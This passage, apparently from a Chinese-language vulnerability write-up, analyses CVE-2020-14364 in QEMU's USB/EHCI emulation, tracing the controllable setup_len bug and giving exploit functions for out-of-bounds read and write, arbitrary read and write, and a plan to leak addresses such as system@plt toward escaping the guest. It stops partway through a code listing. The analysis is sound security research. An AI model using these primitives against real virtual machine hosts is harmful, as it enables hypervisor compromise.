0x%x qtd 0x%x pid 0x%x len %zd endp 0x%x &quot;</span><br>            <span class="hljs-string">&quot;status %d actual_length %d\n&quot;</span>,<br>            p-&gt;<span class="hljs-built_in">queue</span>-&gt;qhaddr, p-&gt;qtd.next,<br>            p-&gt;qtdaddr, p-&gt;pid, p-&gt;packet.iov.size, endp, p-&gt;packet.status,<br>            p-&gt;packet.actual_length);<br><br>    <span class="hljs-keyword">if</span> (p-&gt;packet.actual_length &gt; BUFF_SIZE)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ret from usb_handle_packet &gt; BUFF_SIZE\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里对<code>p-&gt;qtd.token</code> 字段进行一些判断，由于这个字段是可控的，所以我们很容易可以过掉这个判断，进而运行到片段<code>[1]</code>中，片段<code>[1]</code> 是初始化与设备交互的用户内存空间。然后执行到<code>usb_handle_packet</code>函数中。</p>
<p><code>usb_handle_packet</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Hand over a packet to a device for processing.  p-&gt;status ==</span><br><span class="hljs-comment">   USB_RET_ASYNC indicates the processing isn&#x27;t finished yet, the</span><br><span class="hljs-comment">   driver will call usb_packet_complete() when done processing it. */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">usb_handle_packet</span><span class="hljs-params">(USBDevice *dev, USBPacket *p)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (dev == <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;status = USB_RET_NODEV;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    assert(dev == p-&gt;ep-&gt;dev);<br>    assert(dev-&gt;state == USB_STATE_DEFAULT);<br>    usb_packet_check_state(p, USB_PACKET_SETUP);<br>    assert(p-&gt;ep != <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">/* Submitting a new packet clears halt */</span><br>    <span class="hljs-keyword">if</span> (p-&gt;ep-&gt;halted) &#123;<br>        assert(QTAILQ_EMPTY(&amp;p-&gt;ep-&gt;<span class="hljs-built_in">queue</span>));<br>        p-&gt;ep-&gt;halted = <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (QTAILQ_EMPTY(&amp;p-&gt;ep-&gt;<span class="hljs-built_in">queue</span>) || p-&gt;ep-&gt;pipeline || p-&gt;stream) &#123;<br>        usb_process_one(p);<br>        <span class="hljs-keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;<br>            <span class="hljs-comment">/* hcd drivers cannot handle async for isoc */</span><br>            assert(p-&gt;ep-&gt;type != USB_ENDPOINT_XFER_ISOC);<br>            <span class="hljs-comment">/* using async for interrupt packets breaks migration */</span><br>            assert(p-&gt;ep-&gt;type != USB_ENDPOINT_XFER_INT ||<br>                   (dev-&gt;flags &amp; (<span class="hljs-number">1</span> &lt;&lt; USB_DEV_FLAG_IS_HOST)));<br>            usb_packet_set_state(p, USB_PACKET_ASYNC);<br>            QTAILQ_INSERT_TAIL(&amp;p-&gt;ep-&gt;<span class="hljs-built_in">queue</span>, p, <span class="hljs-built_in">queue</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p-&gt;status == USB_RET_ADD_TO_QUEUE) &#123;<br>            usb_queue_one(p);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * When pipelining is enabled usb-devices must always return async,</span><br><span class="hljs-comment">             * otherwise packets can complete out of order!</span><br><span class="hljs-comment">             */</span><br>            assert(p-&gt;stream || !p-&gt;ep-&gt;pipeline ||<br>                   QTAILQ_EMPTY(&amp;p-&gt;ep-&gt;<span class="hljs-built_in">queue</span>));<br>            <span class="hljs-keyword">if</span> (p-&gt;status != USB_RET_NAK) &#123;<br>                usb_packet_set_state(p, USB_PACKET_COMPLETE);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        usb_queue_one(p);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里直接调用<code>usb_process_one</code> 函数。</p>
<p><code>usb_process_one</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">usb_process_one</span><span class="hljs-params">(USBPacket *p)</span><br>&#123;<br>    USBDevice *dev = p-&gt;ep-&gt;dev;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Handlers expect status to be initialized to USB_RET_SUCCESS, but it</span><br><span class="hljs-comment">     * can be USB_RET_NAK here from a previous usb_process_one() call,</span><br><span class="hljs-comment">     * or USB_RET_ASYNC from going through usb_queue_one().</span><br><span class="hljs-comment">     */</span><br>    p-&gt;status = USB_RET_SUCCESS;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;ep-&gt;nr == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">/* control pipe */</span><br>        <span class="hljs-keyword">if</span> (p-&gt;parameter) &#123;<br>            do_parameter(dev, p);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">switch</span> (p-&gt;pid) &#123;<br>        <span class="hljs-keyword">case</span> USB_TOKEN_SETUP:<br>            do_token_setup(dev, p);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> USB_TOKEN_IN:<br>            do_token_in(dev, p);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> USB_TOKEN_OUT:<br>            do_token_out(dev, p);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            p-&gt;status = USB_RET_STALL;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* data pipe */</span><br>        usb_device_handle_data(dev, p);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>函数通过<code>p-&gt;pid</code> 判断进入哪个分支，而<code>pid</code> 是我们可控的，从而可以确定进入到哪个分支。这里进入到<code>USB_TOKEN_SETUP</code> 分支，调用<code>do_token_setup</code> 函数。</p>
<p><code>do_token_setup</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_setup</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    <span class="hljs-type">int</span> request, value, index;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;iov.size != <span class="hljs-number">8</span>) &#123;<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);	<span class="hljs-comment">// [1]</span><br>    s-&gt;setup_index = <span class="hljs-number">0</span>;<br>    p-&gt;actual_length = <span class="hljs-number">0</span>;<br>    s-&gt;setup_len   = (s-&gt;setup_buf[<span class="hljs-number">7</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">6</span>];<br>    <span class="hljs-keyword">if</span> (s-&gt;setup_len &gt; <span class="hljs-keyword">sizeof</span>(s-&gt;data_buf)) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                <span class="hljs-string">&quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;</span>,<br>                s-&gt;setup_len, <span class="hljs-keyword">sizeof</span>(s-&gt;data_buf));<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里是漏洞发生的位置，<code>[1]</code> 处通过用户可控的<code>p-&gt;iov.base</code> 与<code>p-&gt;iov.size</code> 对<code>s-&gt;setup_buf</code> 进行赋值，从而能够控制<code>s-&gt;setup_len</code> 的长度，造成后续的越界读写。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="越界读"><a href="#越界读" class="headerlink" title="越界读"></a>越界读</h3><ol>
<li>调用<code>do_token_setup</code> 设置越界长度</li>
<li>调用<code>do_token_in</code> 将<code>s-&gt;data_buf</code> 数据复制到用户空间，实现越界读</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">do_copy_read</span><span class="hljs-params">()</span>&#123;<br><br>    reset_enable_port();<br>    set_qh();<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_IN &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x1e00</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = virt2phys(data_buf_oob);<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do_copy_read Success!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="越界写"><a href="#越界写" class="headerlink" title="越界写"></a>越界写</h3><ol>
<li>调用<code>do_token_setup</code> 设置越界长度</li>
<li>调用<code>do_token_out</code> 将用户空间数据写入<code>s-&gt;data_buf</code> 中，实现越界写</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">do_copy_write</span><span class="hljs-params">(<span class="hljs-type">int</span> offset, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> setup_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> setup_index)</span>&#123;<br><br>    reset_enable_port();<br>    set_qh();<br><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf_oob + offset) = <span class="hljs-number">0x0000000200000002</span>; <span class="hljs-comment">// 覆盖成原先的内容</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(data_buf_oob + <span class="hljs-number">0x8</span> +offset) = setup_len; <span class="hljs-comment">//setup_len</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(data_buf_oob + <span class="hljs-number">0xc</span>+ offset) = setup_index;<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_OUT &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x1e00</span> &lt;&lt; QTD_TOKEN_TBYTES_SH; <span class="hljs-comment">// flag</span><br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = virt2phys(data_buf_oob);<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do_copy_write Success!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="任意读"><a href="#任意读" class="headerlink" title="任意读"></a>任意读</h3><p>这里的任意读是在越界读写的条件下，实现任意地址读。</p>
<img src="/img/CVE-2020-14364/image-20240725212516328.png" srcset="/img/loading.gif" lazyload alt="image-20240725212516328" style="zoom:50%;" />

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">arb_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> target_addr)</span><br>&#123;<br>    setup_state_data();<br><br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br><br>    do_copy_write(<span class="hljs-number">0</span>, <span class="hljs-number">0x1010</span>, <span class="hljs-number">0xfffffff8</span><span class="hljs-number">-0x1010</span>);<br><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf) = <span class="hljs-number">0x2000000000000080</span>; <span class="hljs-comment">// set setup[0] -&gt; USB_DIR_IN</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> target_offset = target_addr - data_buf_addr;<br><br>    do_copy_write(<span class="hljs-number">0x8</span>, <span class="hljs-number">0xffff</span>, target_offset - <span class="hljs-number">0x1018</span>);<br>    do_copy_read(); <span class="hljs-comment">// oob read</span><br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;arb_read Success!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h3><p>同上述任意读，实现任意写的思路如下：</p>
<img src="/img/CVE-2020-14364/image-20240725212615547.png" srcset="/img/loading.gif" lazyload alt="image-20240725212615547" style="zoom:50%;" />

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> target_addr, <span class="hljs-type">uint64_t</span> payload)</span><br>&#123;<br>    setup_state_data();<br><br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset = target_addr - data_buf_addr;<br>    do_copy_write(<span class="hljs-number">0</span>, offset+<span class="hljs-number">0x8</span>, offset<span class="hljs-number">-0x1010</span>);<br><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf) = payload;<br>    do_copy_write(<span class="hljs-number">0</span>, <span class="hljs-number">0xffff</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;arb_write Success!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li>通过越界读，获取<code>USBDevice</code> 对象的地址，通过计算偏移，可以得到<code>data_buf</code> 与 <code>USBPort</code> 字段的地址。搜索越界读的内容，可以泄露代码段地址，可以得到程序基地址与<code>system@plt</code>的地址。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span>&#123;</span><br>    DeviceState qdev;<br>    USBPort *port;<br>    <span class="hljs-type">char</span> *port_path;<br>    <span class="hljs-type">char</span> *serial;<br>    <span class="hljs-type">void</span> *opaque;<br>    <span class="hljs-type">uint32_t</span> flags;<br><br>    <span class="hljs-comment">/* Actual connected speed */</span><br>    <span class="hljs-type">int</span> speed;<br>    <span class="hljs-comment">/* Supported speeds, not in info because it may be variable (hostdevs) */</span><br>    <span class="hljs-type">int</span> speedmask;<br>    <span class="hljs-type">uint8_t</span> addr;<br>    <span class="hljs-type">char</span> product_desc[<span class="hljs-number">32</span>];<br>    <span class="hljs-type">int</span> auto_attach;<br>    <span class="hljs-type">bool</span> attached;<br>    <span class="hljs-type">int32_t</span> state;<br>    <span class="hljs-type">uint8_t</span> setup_buf[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">uint8_t</span> data_buf[<span class="hljs-number">4096</span>]; &lt;-----------<br>    <span class="hljs-type">int32_t</span> remote_wakeup;<br>    <span class="hljs-type">int32_t</span> setup_state;<br>    <span class="hljs-type">int32_t</span> setup_len;<br>    <span class="hljs-type">int32_t</span> setup_index;<br><br>    USBEndpoint ep_ctl;<br>    USBEndpoint ep_in[USB_MAX_ENDPOINTS];<br>    USBEndpoint ep_out[USB_MAX_ENDPOINTS];<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBEndpoint</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span> nr;<br>    <span class="hljs-type">uint8_t</span> pid;<br>    <span class="hljs-type">uint8_t</span> type;<br>    <span class="hljs-type">uint8_t</span> ifnum;<br>    <span class="hljs-type">int</span> max_packet_size;<br>    <span class="hljs-type">int</span> max_streams;<br>    <span class="hljs-type">bool</span> pipeline;<br>    <span class="hljs-type">bool</span> halted;<br>    USBDevice *dev;<br>    QTAILQ_HEAD(, USBPacket) <span class="hljs-built_in">queue</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>



<ol start="2">
<li>USBDevice 会在 realize 时，调用<code>usb_claim_port</code>，将USBDevice中的port字段设置为指向<br>EHCIState中的ports的地址，读取<code>USBDevice-&gt;port</code>的内容就能获得<code>EHCIState-&gt;ports</code>的地址，减去偏移得到 <code>EHCIState</code>的地址。进而得到<code>EHCIState-&gt;irq</code>地址。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">usb_device_class_init</span><span class="hljs-params">(ObjectClass *klass, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *k = DEVICE_CLASS(klass);<br>    k-&gt;bus_type = TYPE_USB_BUS;<br>    k-&gt;realize  = usb_qdev_realize;<br>    k-&gt;unrealize = usb_qdev_unrealize;<br>    k-&gt;props    = usb_props;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">usb_qdev_realize</span><span class="hljs-params">(DeviceState *qdev, Error **errp)</span><br>&#123;<br>    USBDevice *dev = USB_DEVICE(qdev);<br>    Error *local_err = <span class="hljs-literal">NULL</span>;<br><br>    pstrcpy(dev-&gt;product_desc, <span class="hljs-keyword">sizeof</span>(dev-&gt;product_desc),<br>            usb_device_get_product_desc(dev));<br>    dev-&gt;auto_attach = <span class="hljs-number">1</span>;<br>    QLIST_INIT(&amp;dev-&gt;strings);<br>    usb_ep_init(dev);<br><br>    usb_claim_port(dev, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err) &#123;<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    usb_device_realize(dev, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err) &#123;<br>        usb_release_port(dev);<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dev-&gt;auto_attach) &#123;<br>        usb_device_attach(dev, &amp;local_err);<br>        <span class="hljs-keyword">if</span> (local_err) &#123;<br>            usb_qdev_unrealize(qdev, <span class="hljs-literal">NULL</span>);<br>            error_propagate(errp, local_err);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">usb_claim_port</span><span class="hljs-params">(USBDevice *dev, Error **errp)</span><br>&#123;<br>    USBBus *bus = usb_bus_from_device(dev);<br>    USBPort *port;<br><br>    assert(dev-&gt;port == <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (dev-&gt;port_path) &#123;<br>        QTAILQ_FOREACH(port, &amp;bus-&gt;<span class="hljs-built_in">free</span>, next) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(port-&gt;path, dev-&gt;port_path) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (port == <span class="hljs-literal">NULL</span>) &#123;<br>            error_setg(errp, <span class="hljs-string">&quot;usb port %s (bus %s) not found (in use?)&quot;</span>,<br>                       dev-&gt;port_path, bus-&gt;qbus.name);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (bus-&gt;nfree == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-built_in">strcmp</span>(object_get_typename(OBJECT(dev)), <span class="hljs-string">&quot;usb-hub&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">/* Create a new hub and chain it on */</span><br>            usb_try_create_simple(bus, <span class="hljs-string">&quot;usb-hub&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (bus-&gt;nfree == <span class="hljs-number">0</span>) &#123;<br>            error_setg(errp, <span class="hljs-string">&quot;tried to attach usb device %s to a bus &quot;</span><br>                       <span class="hljs-string">&quot;with no free ports&quot;</span>, dev-&gt;product_desc);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        port = QTAILQ_FIRST(&amp;bus-&gt;<span class="hljs-built_in">free</span>);<br>    &#125;<br>    trace_usb_port_claim(bus-&gt;busnr, port-&gt;path);<br><br>    QTAILQ_REMOVE(&amp;bus-&gt;<span class="hljs-built_in">free</span>, port, next);<br>    bus-&gt;nfree--;<br><br>    dev-&gt;port = port;<br>    port-&gt;dev = dev;<br><br>    QTAILQ_INSERT_TAIL(&amp;bus-&gt;used, port, next);<br>    bus-&gt;nused++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">usb_ehci_realize</span><span class="hljs-params">(EHCIState *s, DeviceState *dev, Error **errp)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (s-&gt;portnr &gt; NB_PORTS)<br>    &#123;<br>        error_setg(errp, <span class="hljs-string">&quot;Too many ports! Max. port number is %d.&quot;</span>,<br>                   NB_PORTS);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (s-&gt;maxframes &lt; <span class="hljs-number">8</span> || s-&gt;maxframes &gt; <span class="hljs-number">512</span>)<br>    &#123;<br>        error_setg(errp, <span class="hljs-string">&quot;maxframes %d out if range (8 .. 512)&quot;</span>,<br>                   s-&gt;maxframes);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    usb_bus_new(&amp;s-&gt;bus, <span class="hljs-keyword">sizeof</span>(s-&gt;bus), s-&gt;companion_enable ? &amp;ehci_bus_ops_companion : &amp;ehci_bus_ops_standalone, dev);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; s-&gt;portnr; i++)<br>    &#123;<br>        usb_register_port(&amp;s-&gt;bus, 